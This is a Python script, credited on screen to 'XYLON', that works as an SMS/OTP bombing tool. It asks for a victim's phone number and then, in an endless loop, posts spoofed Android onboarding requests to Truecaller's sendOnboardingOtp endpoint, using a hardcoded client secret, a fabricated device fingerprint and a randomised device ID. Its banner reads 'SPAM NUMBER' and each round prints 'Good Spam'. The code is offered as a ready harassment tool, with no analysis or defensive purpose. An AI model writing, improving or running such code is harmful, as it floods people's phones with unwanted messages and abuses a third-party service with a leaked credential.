import os
try:
	import requests
	import hashlib, random
	import telebot
	from telebot import types
	import os
	import time
	import sys
except:
	os.system('pip install time')
	os.system('pip install pyTelegramBotAPI')
a22 = '\x1b[38;5;216m'
a12 = '\x1b[38;5;220m'
sys.stdout.write('\033[1m\x1b]2;)☢️SPAM NUMBER 🔰\x07')
import time

def typewriter(text, delay=0.9):
  for letter in text:
    print(letter, end='', flush=True)
    time.sleep(delay)
  print()
    
typewriter("""

\033[31m         𝟭𝟬%

\033[32m         𝟮𝟬%

\033[33m         𝟯𝟬%

\033[34m         𝟰𝟬%

\033[35m         𝟱𝟬%

\033[36m         𝟲𝟬%

\033[37m         𝟳𝟬%

\033[1;30m         𝟴𝟬%

\033[1;34m         𝟵𝟬%

\033[37m         𝐒𝐓𝐀𝐑𝐓𝐈𝐍𝐆••••••••••••••••••••""", 0.03)

os.system('clear')
print("                 \033[45m𝐒𝐂𝐑𝐈𝐏𝐓" + " 𝐌𝐀𝐃𝐄 𝐁𝐘 𝐗𝐘𝐋𝐎𝐍\033[40m")
nu = input(f"""{a12}
\033[32m
 ██   ██▒▓██   ██▓ ██▓     ▒█████   ███▄    █ 
▒▒ █ █ ▒░ ▒██  ██▒▓██▒    ▒██▒  ██▒ ██ ▀█   █ 
░░  █   ░  ▒██ ██░▒██░    ▒██░  ██▒▓██  ▀█ ██▒
\033[37m ░ █ █ ▒   ░ ▐██▓░▒██░    ▒██   ██░▓██▒  ▐▌██▒
\033[37m▒██▒ ▒██▒  ░ ██▒▓░░██████▒░ ████▓▒░▒██░   ▓██░
\033[37m▒▒ ░ ░▓ ░   ██▒▒▒ ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
\033[37m░░   ░▒ ░ ▓██ ░▒░ ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
\033[37m ░    ░   ▒ ▒ ░░    ░ ░   ░ ░ ░ ▒     ░   ░ ░ 
\033[37m ░    ░   ░ ░         ░  ░    ░ ░           ░ 
\033[37m          ░ ░                                  
\033[1mFast your country code and second your number.

\033[1m\033[33mEnter Your Numper : """)
while True:
	asa = '123456789'
	gigk = str(''.join(random.choice(asa) for i in range(10)))
	md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
	headers = {
    "Host": "account-asia-south1.truecaller.com",
    "content-type": "application/json; charset\u003dUTF-8",
    "content-length": "680",
    "accept-encoding": "gzip",
    "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
    "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
  }
	url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"
	data = '{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"'+md5+'","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":"'+nu+'","region":"region-2","sequenceNo":1}'
	req = requests.post(url, headers=headers, data=data).text
	print(req)
	print(f'{a22}\033[33mGood Spam {nu}')
	time.sleep(40)